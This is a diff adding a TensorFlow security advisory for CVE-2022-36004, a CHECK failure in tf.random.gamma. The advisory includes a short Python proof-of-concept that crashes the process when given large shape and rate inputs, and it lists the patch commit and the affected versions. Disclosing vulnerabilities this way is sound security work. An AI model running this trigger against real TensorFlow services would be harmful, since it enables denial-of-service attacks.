@@ -1,0 +1,21 @@
+<h2>TFSA-2022-132: <code>CHECK</code> fail in <code>tf.random.gamma</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-36004</p>
+<h3>Impact</h3>
+<p>When <code>tf.random.gamma</code> receives large input shape and rates, it gives a <code>CHECK</code> fail that can trigger a denial of service attack.
+<code>python
+import tensorflow as tf
+arg_0=tf.random.uniform(shape=(4,), dtype=tf.int32, maxval=65536)
+arg_1=tf.random.uniform(shape=(4, 4), dtype=tf.float64, maxval=None)
+arg_2=tf.random.uniform(shape=(4, 4, 4, 4, 4), dtype=tf.float64, maxval=None)
+arg_3=tf.float64
+arg_4=48
+arg_5='None'
+tf.random.gamma(shape=arg_0, alpha=arg_1, beta=arg_2, dtype=arg_3, seed=arg_4, name=arg_5)</code></p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/552bfced6ce4809db5f3ca305f60ff80dd40c5a3">552bfced6ce4809db5f3ca305f60ff80dd40c5a3</a>.</p>
+<p>The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by 刘力源, Information System &amp; Security and Countermeasures Experiments Center, Beijing Institute of Technology.</p>
